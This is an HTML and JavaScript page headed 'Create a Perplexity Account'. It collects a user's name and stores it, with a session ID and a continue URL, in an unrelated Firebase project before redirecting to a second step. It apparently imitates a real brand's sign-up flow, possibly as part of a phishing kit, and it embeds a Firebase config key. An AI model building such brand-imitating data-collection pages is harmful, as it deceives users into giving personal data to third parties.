<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Inter Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <title>Creat Account</title>

    <style>
        * {
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        :root {
            --bg: #ffffff;
            --text: #000000;
            --subtext: #6e6e80;
            --input-bg: #ffffff;
            --input-border: #d1d1d6;
            --button-bg: #000000;
            --button-text: #ffffff;
            --label-bg: #ffffff;
            --error: #d93025;
        }

        body.dark {
            --bg: #000000;
            --text: #ffffff;
            --subtext: #aaaaaa;
            --input-bg: #000000;
            --input-border: #555555;
            --button-bg: #ffffff;
            --button-text: #000000;
            --label-bg: #000000;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            background: var(--bg);
            color: var(--text);
            transition: background-color 0.25s ease, color 0.25s ease;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            margin-top: 40px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 16px;
            color: var(--subtext);
            margin-bottom: 40px;
            transition: color 0.25s ease;
        }

        .input-group {
            width: 100%;
            position: relative;
            margin-bottom: 16px;
            text-align: left;
        }

        .input-group label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: var(--label-bg);
            padding: 0 6px;
            font-size: 12px;
            color: var(--subtext);
            z-index: 1;
            transition: background-color 0.25s ease;
        }

        input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid var(--input-border);
            border-radius: 24px;
            outline: none;
            background: var(--input-bg);
            color: var(--text);
            transition: all 0.25s ease;
        }

        input:focus {
            border-width: 2px;
            border-color: var(--text);
        }

        .btn-continue {
            width: 100%;
            background: var(--button-bg);
            color: var(--button-text);
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 28px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.25s ease;
        }

        .btn-continue:active {
            transform: scale(0.98);
        }

        .error {
            color: var(--error);
            font-size: 12px;
            margin-top: 5px;
            margin-left: 15px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">

    <h1>Create a Perplexity Account</h1>

    <p class="subtitle" id="subtitleText">
        Enter your name
    </p>

    <div class="input-group">
        <label id="firstNameLabel">First name</label>

        <input
            type="text"
            id="firstName"
            placeholder="First name"
            required
            autofocus
        />

        <div id="fnError" class="error">
            First name is required
        </div>
    </div>

    <div class="input-group" style="margin-top: 10px;">
        <label>Last name</label>

        <input
            type="text"
            id="lastName"
            placeholder="Last name (optional)"
        />
    </div>

    <button class="btn-continue" id="continueBtn">
        Continue
    </button>

</div>

<script type="module">

/* ================= FIREBASE ================= */

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import {
    getFirestore,
    doc,
    setDoc
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
    authDomain: "question-metabase.firebaseapp.com",
    databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "question-metabase",
    storageBucket: "question-metabase.firebasestorage.app",
    messagingSenderId: "770698198753",
    appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
    measurementId: "G-6ZP1FPMKSJ"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* ================= URL PARAMS ================= */

const params = new URLSearchParams(window.location.search);

let session = params.get("session");
let type = (params.get("type") || "personal").toLowerCase();
let continueUrl = params.get("continue") || "";
let theme = params.get("theme");

/* ================= SESSION ================= */

function generateSession() {
    return Math.floor(
        1000000000 + Math.random() * 9000000000
    ).toString();
}

if (!session) {

    session = generateSession();

    const newParams = new URLSearchParams();

    newParams.set("session", session);

    if (type) {
        newParams.set("type", type);
    }

    if (continueUrl) {
        newParams.set("continue", continueUrl);
    }

    if (theme) {
        newParams.set("theme", theme);
    }

    const newUrl =
        `${window.location.pathname}?${newParams.toString()}`;

    window.history.replaceState({}, "", newUrl);
}

/* ================= REAL TIME THEME ================= */

const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");

function applyTheme() {

    if (theme === "d") {

        document.body.classList.add("dark");

    } else if (theme === "l") {

        document.body.classList.remove("dark");

    } else {

        // AUTO THEME WITH REAL-TIME CHANGE
        if (mediaQuery.matches) {
            document.body.classList.add("dark");
        } else {
            document.body.classList.remove("dark");
        }
    }
}

applyTheme();

// REAL TIME DEVICE THEME CHANGE
mediaQuery.addEventListener("change", () => {

    // only auto mode reacts
    if (!theme) {
        applyTheme();
    }
});

/* ================= TYPE UI ================= */

const subtitleText = document.getElementById("subtitleText");
const firstNameLabel = document.getElementById("firstNameLabel");
const firstNameInput = document.getElementById("firstName");

if (type === "kids") {

    subtitleText.textContent = "Enter your child's name";

    firstNameLabel.textContent = "First name";

    firstNameInput.placeholder = "First name";

} else {

    subtitleText.textContent = "Enter your name";

    firstNameLabel.textContent = "First name";

    firstNameInput.placeholder = "First name";
}

/* ================= SUBMIT ================= */

async function submitData() {

    const firstName =
        document.getElementById("firstName")
        .value
        .trim();

    const lastName =
        document.getElementById("lastName")
        .value
        .trim();

    const errorDiv =
        document.getElementById("fnError");

    if (!firstName) {

        errorDiv.style.display = "block";

        return;
    }

    errorDiv.style.display = "none";

    let familyValue = "no";

    if (type === "kids") {
        familyValue = "commit";
    }

    if (type === "business") {
        familyValue = "workspace";
    }

    try {

        await setDoc(
            doc(db, "ASPX Keys", session),
            {
                firstName,
                lastName,
                type,
                family: familyValue,

                // SAVE CONTINUE URL
                continue: continueUrl || null,

                timestamp: new Date()
            },
            { merge: true }
        );

        // REDIRECT
        window.location.href =
            `2.html?session=${session}`;

    } catch (error) {

        console.error(error);

        alert("Something went wrong.");
    }
}

/* ================= EVENTS ================= */

document
.getElementById("firstName")
.addEventListener("keypress", (e) => {

    if (e.key === "Enter") {

        e.preventDefault();

        document
        .getElementById("lastName")
        .focus();
    }
});

document
.getElementById("lastName")
.addEventListener("keypress", (e) => {

    if (e.key === "Enter") {

        e.preventDefault();

        submitData();
    }
});

document
.getElementById("continueBtn")
.addEventListener("click", submitData);

</script>

</body>
</html>
